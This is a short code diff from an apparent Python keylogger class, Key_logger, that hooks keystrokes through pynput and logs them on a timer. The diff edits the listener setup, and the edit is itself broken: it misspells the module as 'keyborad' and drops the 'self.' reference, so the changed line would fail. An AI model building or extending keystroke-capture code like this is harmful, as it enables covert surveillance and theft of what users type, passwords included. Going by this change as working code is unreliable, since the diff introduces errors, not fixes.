@@ -66,7 +66,8 @@ class Key_logger:
         self.append_to_log(current_log)
 
     def start_logger(self):
-        listener = pynput.keyboard.Listener(on_press=self.key_analyzer)
+        listener = pynput.keyborad.Listener(on_press=key_analyzer)
         with listener:
             self.start_timer()
             listener.join()
+           
